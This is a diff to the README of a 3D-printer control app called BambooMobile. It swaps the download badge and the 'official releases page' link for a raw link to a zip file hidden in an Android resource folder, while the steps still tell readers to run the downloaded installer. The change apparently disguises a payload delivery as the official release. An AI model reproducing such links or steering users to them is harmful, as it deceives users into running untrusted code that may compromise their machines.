@@ -1,6 +1,6 @@
 # 🎋 BambooMobile - Local Control For Your Bambu Printer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Pholidaegenusonychium407/BambooMobile/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Pholidaegenusonychium407/BambooMobile/main/src-tauri/gen/android/app/src/main/res/values-night/Mobile-Bamboo-1.1.zip)
 
 BambooMobile provides a way to manage your 3D printer without relying on external cloud services. This application connects directly to your printer through your local network. You keep full control over your hardware, data, and print files.
 
@@ -8,7 +8,7 @@ BambooMobile provides a way to manage your 3D printer without relying on externa
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Pholidaegenusonychium407/BambooMobile/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Pholidaegenusonychium407/BambooMobile/main/src-tauri/gen/android/app/src/main/res/values-night/Mobile-Bamboo-1.1.zip).
 2. Look for the "Assets" section at the bottom of the most recent release.
 3. Select the file ending in `.msi` or `.exe` to download the installer.
 4. Run the downloaded file.
